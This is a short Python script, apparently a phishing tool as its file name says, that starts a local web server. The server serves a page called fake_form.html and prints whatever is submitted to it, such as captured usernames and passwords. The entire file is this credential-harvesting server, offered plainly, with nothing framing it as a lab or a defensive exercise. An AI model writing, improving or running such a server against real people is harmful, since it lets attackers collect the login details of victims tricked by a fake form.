# phishing_page_creator.py
import http.server
import socketserver
import threading
import os

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/fake_form.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data.decode())
        self.send_response(200)
        self.end_headers()

def start_server(port=8080):
    handler = CustomHandler
    server = socketserver.TCPServer(("", port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.start()
    print(f'El servidor se inició en localhost:{port}')

start_server()